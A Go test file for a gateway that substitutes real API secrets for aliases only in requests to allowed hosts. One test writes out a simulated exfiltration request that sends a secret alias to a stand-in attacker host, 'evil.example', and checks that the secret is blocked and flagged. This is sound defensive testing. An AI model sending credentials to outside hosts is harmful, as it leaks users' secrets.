package gateway

import (
	"bytes"
	"strings"
	"testing"
)

func TestMintAliasUniqueAndFormatPreserving(t *testing.T) {
	seen := map[string]bool{}
	for i := 0; i < 1000; i++ {
		a, err := MintAlias("sk-")
		if err != nil {
			t.Fatal(err)
		}
		if !strings.HasPrefix(a, "sk-") {
			t.Fatalf("alias %q lost its format prefix", a)
		}
		if !strings.Contains(a, aliasMarker) {
			t.Fatalf("alias %q missing marker", a)
		}
		if seen[a] {
			t.Fatalf("duplicate alias %q", a)
		}
		seen[a] = true
	}
	// Opaque (no prefix) also works.
	if a, err := MintAlias(""); err != nil || a == "" {
		t.Fatalf("opaque mint: %q %v", a, err)
	}
}

func bindingFor(t *testing.T, name, value string, hosts ...string) Binding {
	t.Helper()
	var pats []HostPattern
	for _, h := range hosts {
		p, err := ParseHostPattern(h)
		if err != nil {
			t.Fatal(err)
		}
		pats = append(pats, p)
	}
	return Binding{SecretName: name, AllowedHosts: pats, Value: func() (string, error) { return value, nil }}
}

func TestSubstituteAllowedHost(t *testing.T) {
	tbl := NewAliasTable()
	alias, _ := MintAlias("sk_live_")
	tbl.Add(alias, bindingFor(t, "STRIPE_KEY", "sk_live_REALSECRET", "api.stripe.com"))

	req := []byte("GET /v1/charges HTTP/1.1\r\nHost: api.stripe.com\r\nAuthorization: Bearer " + alias + "\r\n\r\n")
	res, err := tbl.Substitute("api.stripe.com", req)
	if err != nil {
		t.Fatal(err)
	}
	if bytes.Contains(res.Body, []byte(alias)) {
		t.Error("alias should have been replaced")
	}
	if !bytes.Contains(res.Body, []byte("sk_live_REALSECRET")) {
		t.Error("real secret should be present after substitution")
	}
	if len(res.Used) != 1 || len(res.Exfil) != 0 {
		t.Errorf("used=%v exfil=%v, want 1 used / 0 exfil", res.Used, res.Exfil)
	}
}

func TestSubstituteExfilAttemptBlocked(t *testing.T) {
	tbl := NewAliasTable()
	alias, _ := MintAlias("sk_live_")
	tbl.Add(alias, bindingFor(t, "STRIPE_KEY", "sk_live_REALSECRET", "api.stripe.com"))

	// A compromised guest sends the alias to an attacker host it's also allowed
	// to reach. The real secret must NOT be substituted, and it's flagged.
	req := []byte("POST / HTTP/1.1\r\nHost: evil.example\r\nX: " + alias + "\r\n\r\n")
	res, err := tbl.Substitute("evil.example", req)
	if err != nil {
		t.Fatal(err)
	}
	if bytes.Contains(res.Body, []byte("sk_live_REALSECRET")) {
		t.Fatal("real secret leaked to a non-allowed host!")
	}
	if len(res.Exfil) != 1 || res.Exfil[0] != alias {
		t.Errorf("exfil=%v, want the alias flagged", res.Exfil)
	}
	if len(res.Used) != 0 {
		t.Errorf("used=%v, want none", res.Used)
	}
}

func TestSubstituteNoAliasUnchanged(t *testing.T) {
	tbl := NewAliasTable()
	tbl.Add("sk-bhtAAAA", bindingFor(t, "K", "v", "api.example.com"))
	req := []byte("GET / HTTP/1.1\r\nHost: api.example.com\r\n\r\n")
	res, err := tbl.Substitute("api.example.com", req)
	if err != nil {
		t.Fatal(err)
	}
	if !bytes.Equal(res.Body, req) {
		t.Error("body with no alias must be unchanged")
	}
	if len(res.Used) != 0 || len(res.Exfil) != 0 {
		t.Error("no alias → no used/exfil")
	}
}

func TestSubstituteMultipleAliases(t *testing.T) {
	tbl := NewAliasTable()
	a1, _ := MintAlias("sk-")
	a2, _ := MintAlias("ghp_")
	tbl.Add(a1, bindingFor(t, "OPENAI", "real-openai", "api.openai.com"))
	tbl.Add(a2, bindingFor(t, "GH", "real-gh", "api.github.com"))

	// Two aliases, request to api.openai.com: only the OpenAI one substitutes;
	// the GitHub alias heading to openai is an exfil attempt.
	req := []byte("Authorization: Bearer " + a1 + "\nX-Extra: " + a2 + "\n")
	res, err := tbl.Substitute("api.openai.com", req)
	if err != nil {
		t.Fatal(err)
	}
	if !bytes.Contains(res.Body, []byte("real-openai")) {
		t.Error("openai secret should substitute")
	}
	if bytes.Contains(res.Body, []byte("real-gh")) {
		t.Error("github secret must not substitute toward openai")
	}
	if len(res.Used) != 1 || len(res.Exfil) != 1 {
		t.Errorf("used=%v exfil=%v, want 1/1", res.Used, res.Exfil)
	}
}
